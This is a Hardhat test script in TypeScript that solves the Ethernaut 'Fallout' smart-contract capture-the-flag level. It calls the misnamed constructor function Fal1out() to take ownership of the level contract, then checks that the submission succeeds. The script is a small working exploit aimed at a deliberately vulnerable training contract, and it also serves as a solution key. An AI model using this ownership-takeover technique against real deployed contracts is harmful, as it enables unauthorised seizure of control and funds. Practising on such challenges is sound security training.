import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { expect } from "chai";
import { Contract } from "ethers";
import { ethers } from "hardhat";
import { getNewInstance, submitInstance } from "../utils";

const LEVEL_ADDRESS = "0x5732B2F88cbd19B6f01E3a96e9f0D90B917281E5";

let owner: SignerWithAddress;
let attacker: SignerWithAddress;
let txn: any;
let contract: Contract;

describe.only("Fallout", () => {

    beforeEach(async () => {
        [owner, attacker] = await ethers.getSigners();

        const contractFactory = await ethers.getContractFactory("Fallout");
        const challengeAddr = await getNewInstance(LEVEL_ADDRESS);
        contract = await contractFactory.attach(challengeAddr);
    });

    it("Should solve the challenge", async function () {

        const initialOwner = await contract.owner();

        expect(await submitInstance(contract.address)).to.be.false;
        expect(initialOwner).to.not.equal(owner.address);

        txn = await contract.Fal1out();
        await txn.wait();

        const currentOwner = await contract.owner();

        expect(currentOwner).to.equal(owner.address);        
        expect(await submitInstance(contract.address), "level is not complete").to.be.true;
    });
});